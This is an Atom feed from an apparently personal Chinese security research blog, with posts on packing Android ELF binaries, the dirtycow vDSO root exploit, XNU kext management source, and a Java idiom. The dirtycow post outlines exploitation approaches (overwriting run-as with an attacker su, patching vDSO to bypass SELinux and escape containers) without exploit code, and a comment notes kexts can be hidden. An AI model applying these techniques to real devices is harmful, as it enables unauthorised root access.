<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>FloatingGuy&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-03-28T15:13:47.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>FloatingGuy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android ELF 文件加壳</title>
    <link href="http://yoursite.com/2017/03/28/Android-ELF-%E6%96%87%E4%BB%B6%E5%8A%A0%E5%A3%B3/"/>
    <id>http://yoursite.com/2017/03/28/Android-ELF-文件加壳/</id>
    <published>2017-03-28T14:38:01.000Z</published>
    <updated>2017-03-28T15:13:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>测试，给 ELF 可执行文件的 特定section 加密。。。<br><a id="more"></a></p>
<p>目前需要对 某个工具做加密处理，但是没有发现公开的可以对 elf 可执行文件加壳的本地工具。于是参照网上 的文章修改了一个自己的加固工具，非常的菜-入门级的。</p>
<p>参考文章：<br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E7%90%86%E8%A7%A3elf%E6%A0%BC%E5%BC%8F/" target="_blank" rel="external">SO加固系列之理解ELF格式</a><br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E5%8A%A0%E5%A3%B3%E5%8E%9F%E7%90%86%E5%8F%8Apython%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">SO加固系列之加壳原理及Python实现</a><br><a href="http://burningcodes.net/so%E5%8A%A0%E5%9B%BA%E7%B3%BB%E5%88%97%E4%B9%8B%E8%BF%90%E8%A1%8C%E6%97%B6%E8%A7%A3%E5%AF%86/" target="_blank" rel="external">SO加固系列之运行时解密</a></p>
<h3 id="第一版-ELF-可执行文件加密"><a href="#第一版-ELF-可执行文件加密" class="headerlink" title="第一版 ELF 可执行文件加密"></a>第一版 ELF 可执行文件加密</h3><h4 id="修改的地方"><a href="#修改的地方" class="headerlink" title="修改的地方"></a>修改的地方</h4><p>不能再用 head 中的 e_entry 和 e_shoff 保存加密段的长度和偏移信息了。因为 可执行文件的加载时会跳到这个入口地址去执行。</p>
<p>尝试了 head 中的几个字段发现都不能被修改。于是最快的办法就是 手动测试 偏移地址和 size ，然后在解密代码中 硬编码 偏移量和 size（这个方法很愚蠢）。</p>
<p>具体对 文章代码做的修改:<br>1.手动 修改 源码，中 【1】mAddr, 【2】size, 【3】name /<em> maps 中的 app name</em>/<br><strong>修改 mAddr 和 size 是需要借助010 工具</strong>，对比 patch 前后的二进制文件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">exp</span>.c 文件。</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> name[] = <span class="string">"被加壳 app 的名字"</span>;    <span class="comment">//patch1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">new_init</span><span class="params">()</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//printf("[+] decrypt\n");</span></div><div class="line">    <span class="comment">// getchar();</span></div><div class="line"></div><div class="line">    Elf32_Ehdr *elfhdr;</div><div class="line">    Elf32_Shdr *shdr;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size, base, offset;</div><div class="line">    <span class="keyword">int</span> n, i;</div><div class="line"></div><div class="line">    <span class="comment">//从maps中读取elf文件在内存中的起始地址</span></div><div class="line">    base = GetLibAddr();</div><div class="line">    <span class="comment">//printf("%x\n", base);</span></div><div class="line">    elfhdr = (Elf32_Ehdr *) base;</div><div class="line">    <span class="comment">//获取要被解密的section的内存地址</span></div><div class="line">    offset = elfhdr-&gt;e_shoff + base;</div><div class="line">    <span class="comment">// lk patch</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> mAddr = <span class="number">0x23b4</span>;            <span class="comment">//patch2</span></div><div class="line">    offset = mAddr + base;</div><div class="line">    <span class="comment">//section大小</span></div><div class="line">    size = elfhdr-&gt;e_entry;</div><div class="line">    <span class="comment">// lk patch</span></div><div class="line">    size = <span class="number">0x3d4</span>;               <span class="comment">//patch3</span></div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>每次修改代码都要重修  上面的几个地方</strong></p>
<ol>
<li>手动 修改 加固脚本 中 【1】文件名,  【2】自定义段名<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">so-encrypt.py 文件</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    df = SO(<span class="string">"libs/armeabi-v7a/xxx"</span>)        <span class="comment">#patch1</span></div><div class="line">    df.EncrySection(<span class="string">"strings"</span>)          <span class="comment">#patch2</span></div><div class="line">    df.Close()</div></pre></td></tr></table></figure>
</li>
</ol>
<p>###Todo List</p>
<table>
<thead>
<tr>
<th>内容</th>
<th>完成情况</th>
</tr>
</thead>
<tbody>
<tr>
<td>1. 优化代码，提高自动化</td>
<td></td>
</tr>
<tr>
<td>2. 添加反调试代码</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;测试，给 ELF 可执行文件的 特定section 加密。。。&lt;br&gt;
    
    </summary>
    
      <category term="研究" scheme="http://yoursite.com/categories/categories-research/"/>
    
    
  </entry>
  
  <entry>
    <title>dirtycow vDSO exploit</title>
    <link href="http://yoursite.com/2017/03/24/dirtycow-vDSO-exploit/"/>
    <id>http://yoursite.com/2017/03/24/dirtycow-vDSO-exploit/</id>
    <published>2017-03-24T15:47:05.000Z</published>
    <updated>2017-03-26T16:44:58.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>最近利用业余时间研究了一下 dirtycow 的 exploit代码。目前看到了2种方法各有优缺点，不存在特别完美的一个。不过这两种方法结合一下应该可以在稳定性上得到进一步的提高。<br>第一种方法：向文件系统中的/system/bin/run-as文件中写入一个攻击者的 su 文件<br>第二种方法：使用 vDSO 修改系统调用。。。    补充。。</p>
<a id="more"></a>
<p>第一种方法比较简单，这里不再专门的介绍，会在分析 dirtycow 原理时介绍。<br>在 <a href="https://github.com/scumjr/dirtycow-vdso" target="_blank" rel="external">dirtycow-vdso</a> 项目的 ReadMe中，作者对 vdso 方法的优缺做了评述：</p>
<blockquote>
<p>此方法 是基于 ptrace 去 patch vDSO. 比起修改文件系统 有如下 <strong>优点</strong>：</p>
<ul>
<li>不需要 setuid 二进制文件 （可以补充 M1， 当没有 run-as 或者 没有执行权限时）</li>
<li>绕过 SELinux</li>
<li>容器逃逸</li>
<li>不会因为文件系统写返回导致内核 crash</li>
</ul>
<p><strong>缺点</strong>：</p>
<ul>
<li>依赖手机架构（应为 payload 使用汇编写）</li>
<li>针对部分 linux 版本</li>
<li>受 vDSO 变化的影响</li>
</ul>
</blockquote>
<p>学习本篇 exploit 主要参考了2篇文章：<br><a href="https://jaq.alibaba.com/community/art/show?articleid=434" target="_blank" rel="external">[翻译] getauxval() and the auxiliary vector</a><br><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-2.html" target="_blank" rel="external">vsyscalls and vDSO</a></p>
<p>第一篇介绍了如何通getauxval()函数 获取 vDSO 创建的页地址。<br><code>getauxval(AT_SYSINFO_EHDR)</code>, 以及 getauxval()函数的由来;这部分内容我只是了解一下，和 exploit 关系不大。</p>
<p>第二篇介绍了 vdso 的原理，vdso 从内核映射到用户空间的1页内存的地址就可以通过<code>getauxval(AT_SYSINFO_EHDR)</code>函数获得。</p>
<hr>
<h4 id="什么是-vDSO"><a href="#什么是-vDSO" class="headerlink" title="什么是 vDSO?"></a>什么是 vDSO?</h4><p>2个概念：</p>
<ul>
<li>vsyscall</li>
<li>vdso</li>
</ul>
<p>我们已经知道，系统调用就是中断当前用户进程然后跳转到内核模式，系统调用句柄完成工作以后再通过一系列的跳转返回用户空间。</p>
<p>vsyscall 和 vdso 机制是用来加速用户态进程调用系统调用的过程，下面来介绍这个机制是如何工作的？</p>
<h4 id="vsyscall"><a href="#vsyscall" class="headerlink" title="vsyscall"></a>vsyscall</h4><p>此机制是Linux 内核中最先出现也是最老的被用来加速执行调用的机制。<br>该机制的原理就是 将内核映射到用户空间的1页内存中，这1页内存包含了一些变量和系统调用的实现。<br>相当于在用户空间实现系统调用， 这样避免了内存切换。<br>x86_64 linux 设备中查看 vsyscall 占据的1页内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">~$ sudo cat /proc/1/maps | grep vsyscall</div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure></p>
<p><code>map_vsyscall</code> 函数负责映射 <code>vsyscall</code>页到用户空间，此函数定义在<code>[arch/x86/entry/vsyscall/vsyscall_64.c](https://github.com/torvalds/linux/blob/master/arch/x86/entry/vsyscall/vsyscall_64.c)</code>文件中。<br><code>map_vsyscall</code>函数在内核初始化时 被 <code>setup_arch</code>调用，次函数在文件<a href="https://github.com/torvalds/linux/blob/master/arch/x86/kernel/setup.c" target="_blank" rel="external">arch/x86/kernel/setup.c</a></p>
<p>…<br>…</p>
<hr>
<h4 id="vDSO"><a href="#vDSO" class="headerlink" title="vDSO"></a>vDSO</h4><p>模块所在位置：<code>arch/x86/entry/vdso/</code><br>入口：<code>vma.c :: init_vdso()</code></p>
<p>vsyscall 已经被 vDSO 或者  <code>virtual dynamic shared object</code> 取代了。<code>vsyscall</code> 和 <code>vDSO</code> 最大的不同是 vDSO 映射内存页到每一个进程以共享对象的格式，但是 vsyscall 在内存中是静态地址并且每次都在相同的地址。 例如 x86_64 架构 对应的文件是 vdso.so.1。<br>所有的用户进程都通过 glibc 链接到这个共享库。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">~$ ldd /bin/uname</div><div class="line">    linux-vdso.so.1 (0x00007ffe014b7000)</div><div class="line">    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fbfee2fe000)</div><div class="line">    /lib64/ld-linux-x86-64.so.2 (0x00005559aab7c000)</div><div class="line"></div><div class="line">or</div><div class="line">~$ sudo cat /proc/1/maps | grep vdso</div><div class="line">7fff39f73000-7fff39f75000 r-xp 00000000 00:00 0       [vdso]</div></pre></td></tr></table></figure>
<p>初始化 vDSO – init_vdso()  此函数 开始就初始化 vdso 镜像。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">init_vdso</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    init_vdso_image(&amp;vdso_image_64);</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_X32_ABI</span></div><div class="line">    init_vdso_image(&amp;vdso_image_x32);</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">..</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>init_vdso_image()  初始化 vdso_image 结构体。<br>结构体定义：</p>
<p>vdso_image_64 的结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> <span class="keyword">struct</span> vdso_image vdso_image_64 = &#123;</div><div class="line">    .data = raw_data,</div><div class="line">    .size = <span class="number">8192</span>,</div><div class="line">    .text_mapping = &#123;</div><div class="line">        .name = <span class="string">"[vdso]"</span>,</div><div class="line">        .pages = pages,</div><div class="line">    &#125;,</div><div class="line">    .alt = <span class="number">3145</span>,</div><div class="line">    .alt_len = <span class="number">26</span>,</div><div class="line">    .sym_vvar_start = <span class="number">-8192</span>,</div><div class="line">    .sym_vvar_page = <span class="number">-8192</span>,</div><div class="line">    .sym_hpet_page = <span class="number">-4096</span>,</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p>
<p>vdso2c 程序从其他文件生成 so。</p>
<p>关于 images 的全部设置都依赖于内核 配置文件。</p>
<p>如果内核配置为 x86  架构或者 x86_64 和通用模式，我们可以使用 <code>int 0x80</code>中断 发起系统调用。<br>如果设置为通用模式，我们可以使用 syscall 指令或者 sysenter 指令 发出系统调用。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_X86_32 || defined CONFIG_COMPAT</span></div><div class="line">  <span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">struct</span> vdso_image vdso_image_32_int80;</div><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPAT</span></div><div class="line">  <span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">struct</span> vdso_image vdso_image_32_syscall;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line"> <span class="keyword">extern</span> <span class="keyword">const</span> <span class="keyword">struct</span> vdso_image vdso_image_32_sysenter;</div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
<p>pages 映射的地址由内核决定，当内核加载二进制文件到内存中时。<br>内核调用 <code>arch_setup_additional_pages</code>函数(vma.c)检查 vDSO 可以在 x86_64 架构上使用并且调用 map_vdso 函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">arch_setup_additional_pages</span><span class="params">(<span class="keyword">struct</span> linux_binprm *bprm, <span class="keyword">int</span> uses_interp)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!vdso64_enabled)</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> map_vdso(&amp;vdso_image_64, <span class="literal">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>当前使用<code>map_vdso_randomized</code>函数替换 <code>map_vdso</code>。</p>
<h4 id="getauxval-AT-SYSINFO-EHDR-获取内核地址"><a href="#getauxval-AT-SYSINFO-EHDR-获取内核地址" class="headerlink" title="getauxval(AT_SYSINFO_EHDR) 获取内核地址"></a>getauxval(AT_SYSINFO_EHDR) 获取内核地址</h4><h4 id="APIs"><a href="#APIs" class="headerlink" title="APIs"></a>APIs</h4><p>###ChangeLog<br>|time| desc|<br>|————–|————–|<br>|2017-3-27 | <a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/syscall-2.html" target="_blank" rel="external">1</a> 文章 分析 vdso 的初始化流程， 页映射，数据结构。  下一步 构思 文章结构。ß|</p>
<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;最近利用业余时间研究了一下 dirtycow 的 exploit代码。目前看到了2种方法各有优缺点，不存在特别完美的一个。不过这两种方法结合一下应该可以在稳定性上得到进一步的提高。&lt;br&gt;第一种方法：向文件系统中的/system/bin/run-as文件中写入一个攻击者的 su 文件&lt;br&gt;第二种方法：使用 vDSO 修改系统调用。。。    补充。。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞" scheme="http://yoursite.com/categories/categories-exploit/"/>
    
    
      <category term="root" scheme="http://yoursite.com/tags/root/"/>
    
      <category term="android" scheme="http://yoursite.com/tags/android/"/>
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>分析Kext管理框架 OSKext class</title>
    <link href="http://yoursite.com/2017/03/21/%E5%88%86%E6%9E%90Kext%E7%AE%A1%E7%90%86%E6%A1%86%E6%9E%B6-OSKext-class/"/>
    <id>http://yoursite.com/2017/03/21/分析Kext管理框架-OSKext-class/</id>
    <published>2017-03-21T03:15:28.000Z</published>
    <updated>2017-03-24T15:31:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<blockquote>
<p>《深入解析MAC OS X &amp; iOS 操作系统》- 第 x 章: xxx</p>
</blockquote>
<p>本篇是[《XNU内核设计–Kext内核扩展》][1]的姊妹篇，上一篇 零零洒洒的从书上看到了 kext的全面介绍，这一篇注重 代码实现(意思就是我们纯分析源码)，分析 Kext 管理框架。</p>
<blockquote>
<p>代码是 XNU 10.12版本。</p>
</blockquote>
<a id="more"></a>
<h3 id="重点知识"><a href="#重点知识" class="headerlink" title="重点知识"></a>重点知识</h3><p>分析 OSKext 实现代码。首先从OSKext 框架的开始initialize()函数分析，然后分析 kextd 发送的9条 Predicate。</p>
<ul>
<li>Load</li>
<li>Start</li>
<li>Stop</li>
<li>Unload</li>
<li>Get Kernel Requests</li>
<li>Get Loaded Kext Info</li>
<li>Get Kernel Image</li>
<li>Get Kernel Load Address</li>
<li>Get All Load Requests</li>
</ul>
<p>上面的 Predicate 列表前5条都会检查 kext_request 的第一个参数 <code>hostPriv</code>, 所以都是需要有 root 权限的（/usr/libexec/kextd就是 root 用户所有），剩下4条不需要特权意思是 普通用户也能调用。</p>
<h3 id="设计框架"><a href="#设计框架" class="headerlink" title="设计框架"></a>设计框架</h3><p>kext 管理框架是接触 XNU 内核的第一个模块，如果单独谈次框架就非常简单了，因为我观察貌似几乎 Kext 相关的功能都在 OSKext class 中就完成了。</p>
<p>所以 分析完本篇准备，按照逆推的顺序向前分析，具体来说就是看看是 谁调用的 OSKext::initialize(void) 上层调用前后如何处理？！</p>
<h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p><img src="/include/img/bk-xnu/mach-o.jpg" alt="mach-o"><br><img src="/include/img/bk-xnu/OSKext-initialize.png" alt="OSKext::initialize"><br>// 初始化<br>void<br>OSKext::initialize(void)<br>{</p>
<pre><code>// 几个重要的 变量-- 和所有的 kext 都相关 ，后面要用
sKextsByID = OSDictionary::withCapacity(kOSKextTypicalLoadCount);   //150
sLoadedKexts = OSArray::withCapacity(kOSKextTypicalLoadCount);  //记录所有加载的 kext （包括内核）， 修改这个结构体 可以做到 影藏 kext
sUnloadedPrelinkedKexts = OSArray::withCapacity(kOSKextTypicalLoadCount / 10);
sKernelRequests = OSArray::withCapacity(0);   // 这应该 能说明 内核是闭包的不需要别的 kext （狭义的闭包）
sPostedKextLoadIdentifiers = OSSet::withCapacity(0);
sAllKextLoadIdentifiers = OSSet::withCapacity(kOSKextTypicalLoadCount);
sRequestCallbackRecords = OSArray::withCapacity(0);
assert(sKextsByID &amp;&amp; sLoadedKexts &amp;&amp; sKernelRequests &amp;&amp;
    sPostedKextLoadIdentifiers &amp;&amp; sAllKextLoadIdentifiers &amp;&amp;
    sRequestCallbackRecords &amp;&amp; sUnloadedPrelinkedKexts);
</code></pre><p>//—————</p>
<pre><code>// 首先要初始化  内核自身的 OSKext
/* Set up an OSKext instance to represent the kernel itself.
*/
sKernelKext = new OSKext;

sKernelKext-&gt;loadTag = sNextLoadTag++;  // the kernel is load tag 0
sKernelKext-&gt;bundleID = OSSymbol::withCString(kOSKextKernelIdentifier);    //&apos;__kernel__&apos;

sKernelKext-&gt;version = OSKextParseVersionString(osrelease);
sKernelKext-&gt;compatibleVersion = sKernelKext-&gt;version;
sKernelKext-&gt;linkedExecutable = kernelExecutable;

//OSKext-&gt;flags
sKernelKext-&gt;flags.hasAllDependencies = 1;
sKernelKext-&gt;flags.kernelComponent = 1;
sKernelKext-&gt;flags.prelinked = 0;
sKernelKext-&gt;flags.loaded = 1;
sKernelKext-&gt;flags.started = 1;
sKernelKext-&gt;flags.CPPInitialized = 0;
sKernelKext-&gt;flags.jettisonLinkeditSeg = 0;
</code></pre><p>//—————<br>    // kernel 的 kmod_info 对象<br>    sKernelKext-&gt;kmod_info = &amp;g_kernel_kmod_info;<br>    strlcpy(g_kernel_kmod_info.version, osrelease,<br>        sizeof(g_kernel_kmod_info.version));<br>    g_kernel_kmod_info.size = kernelLength;<br>    g_kernel_kmod_info.id = sKernelKext-&gt;loadTag;</p>
<p>//—————</p>
<pre><code>//OSKext-&gt;infoDict  设置 kernel 的 Bundle 信息
/**
 * kenel 定义的CFBundle(一共 5个)
 *  #define kCFBundleIdentifierKey                  &quot;CFBundleIdentifier&quot;
    #define kCFBundleVersionKey                     &quot;CFBundleVersion&quot;
    #define kCFBundleNameKey                        &quot;CFBundleName&quot;
    #define kCFBundleExecutableKey                  &quot;CFBundleExecutable&quot;
 */
sKernelKext-&gt;infoDict = OSDictionary::withCapacity(5);
assert(sKernelKext-&gt;infoDict);
setResult = sKernelKext-&gt;infoDict-&gt;setObject(kCFBundleIdentifierKey,
    sKernelKext-&gt;bundleID);
assert(setResult);
setResult = sKernelKext-&gt;infoDict-&gt;setObject(kOSKernelResourceKey,
    kOSBooleanTrue);
assert(setResult);

scratchString = OSString::withCStringNoCopy(osrelease);
assert(scratchString);
setResult = sKernelKext-&gt;infoDict-&gt;setObject(kCFBundleVersionKey,
    scratchString);
assert(setResult);
OSSafeReleaseNULL(scratchString);


scratchString = OSString::withCStringNoCopy(&quot;mach_kernel&quot;);
assert(scratchString);
setResult = sKernelKext-&gt;infoDict-&gt;setObject(kCFBundleNameKey,
    scratchString);
assert(setResult);
OSSafeReleaseNULL(scratchString);
</code></pre><p>//—————</p>
<pre><code>setResult = sKextsByID-&gt;setObject(sKernelKext-&gt;bundleID, sKernelKext);
assert(setResult);
setResult = sLoadedKexts-&gt;setObject(sKernelKext);
assert(setResult);
sKernelKext-&gt;release();         // sKernelKext 引用计数 -1
</code></pre><p>//—————<br>    registryRoot = IORegistryEntry::getRegistryRoot();<br>    kernelCPUType = OSNumber::withNumber(<br>        (long long unsigned int)_mh_execute_header.cputype,<br>        8 <em> sizeof(_mh_execute_header.cputype));<br>    kernelCPUSubtype = OSNumber::withNumber(<br>        (long long unsigned int)_mh_execute_header.cpusubtype,<br>        8 </em> sizeof(_mh_execute_header.cpusubtype));<br>    assert(registryRoot &amp;&amp; kernelCPUSubtype &amp;&amp; kernelCPUType);</p>
<pre><code>registryRoot-&gt;setProperty(kOSKernelCPUTypeKey, kernelCPUType);
registryRoot-&gt;setProperty(kOSKernelCPUSubtypeKey, kernelCPUSubtype);

OSSafeReleaseNULL(kernelCPUType);
OSSafeReleaseNULL(kernelCPUSubtype);

timestamp = __OSAbsoluteTimePtr(&amp;last_loaded_timestamp);
*timestamp = 0;
timestamp = __OSAbsoluteTimePtr(&amp;last_unloaded_timestamp);
*timestamp = 0;
timestamp = __OSAbsoluteTimePtr(&amp;sLastWakeTime);
*timestamp = 0;

OSKextLog(/* kext */ NULL,
    kOSKextLogProgressLevel |
    kOSKextLogGeneralFlag,
    &quot;Kext system initialized.&quot;);

notifyKextLoadObservers(sKernelKext, sKernelKext-&gt;kmod_info);

return;
</code></pre><p>}</p>
<p>/*</p>
<ul>
<li><p>@class OSKext<br><em>/<br>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>*</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>/<br>class OSKext : public OSObject<br>{<br> …</p>
<p> //<br> virtual OSReturn start(bool startDependenciesFlag = true);</p>
<p> …<br>}</p>
</li>
</ul>
<p>OSReturn<br>OSKext::start(bool startDependenciesFlag)<br>{<br>    OSReturn                            result = kOSReturnError;<br>    kern_return_t                       (<em> startfunc)(kmod_info_t </em>, void <em>);      // 指向 kext 模块中的入口函数<br>    unsigned int                        i, count;<br>    void                              </em> kmodStartData = NULL;</p>
<pre><code>if (isStarted() || isInterface() || isKernelComponent()) {
    result = kOSReturnSuccess;
    goto finish;
}

//
if (!isLoaded()) {
    OSKextLog(this,
        kOSKextLogErrorLevel |
        kOSKextLogLoadFlag,
        &quot;Attempt to start nonloaded kext %s.&quot;,
        getIdentifierCString());
    result = kOSKextReturnInvalidArgument;
    goto finish;
}

if (!sLoadEnabled) {
    OSKextLog(this,
        kOSKextLogErrorLevel |
        kOSKextLogLoadFlag,
        &quot;Kext loading is disabled (attempt to start kext %s).&quot;,
        getIdentifierCString());
    result = kOSKextReturnDisabled;
    goto finish;
}

result = validateKextMapping(/* start? */ true);
if (result != kOSReturnSuccess) {
    goto finish;
}

// 从 kmod_info 是 OSKext 成员
startfunc = kmod_info-&gt;start;


...
</code></pre><p>}</p>
<h3 id="Case"><a href="#Case" class="headerlink" title="Case"></a>Case</h3><h3 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h3><h3 id="关联章节"><a href="#关联章节" class="headerlink" title="关联章节"></a>关联章节</h3><h3 id="Dictionary"><a href="#Dictionary" class="headerlink" title="Dictionary"></a>Dictionary</h3><h3 id="Change-Log"><a href="#Change-Log" class="headerlink" title="Change Log"></a>Change Log</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-xx-xx</td>
<td>增加5.5 节</td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;作者：FloatingGuy 转载请注明出处：&lt;a href=&quot;https://floatingguy.github.io/&quot;&gt;https://floatingguy.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;《深入解析MAC OS X &amp;amp; iOS 操作系统》- 第 x 章: xxx&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本篇是[《XNU内核设计–Kext内核扩展》][1]的姊妹篇，上一篇 零零洒洒的从书上看到了 kext的全面介绍，这一篇注重 代码实现(意思就是我们纯分析源码)，分析 Kext 管理框架。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;代码是 XNU 10.12版本。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="XNU 内核源码" scheme="http://yoursite.com/categories/XNU-%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81/"/>
    
    
      <category term="了解" scheme="http://yoursite.com/tags/%E4%BA%86%E8%A7%A3/"/>
    
      <category term="xnu" scheme="http://yoursite.com/tags/xnu/"/>
    
  </entry>
  
  <entry>
    <title>java ArrayList&lt;String&gt;(){{add();}}; 用法说明</title>
    <link href="http://yoursite.com/2017/03/20/java-ArrayList-String-add-%E7%94%A8%E6%B3%95%E8%AF%B4%E6%98%8E/"/>
    <id>http://yoursite.com/2017/03/20/java-ArrayList-String-add-用法说明/</id>
    <published>2017-03-20T06:03:15.000Z</published>
    <updated>2017-03-20T06:50:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>转载自：<a href="https://my.oschina.net/nullObject/blog/181802?p=1" target="_blank" rel="external">https://my.oschina.net/nullObject/blog/181802?p=1</a></p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">new ArrayList&lt;String&gt;()&#123;&#123;</div><div class="line">    add(&quot;&quot;);</div><div class="line">&#125;&#125;;</div></pre></td></tr></table></figure>
<p>java 代码中出现这种写法，好奇add 函数是调用哪里的？<br><a id="more"></a></p>
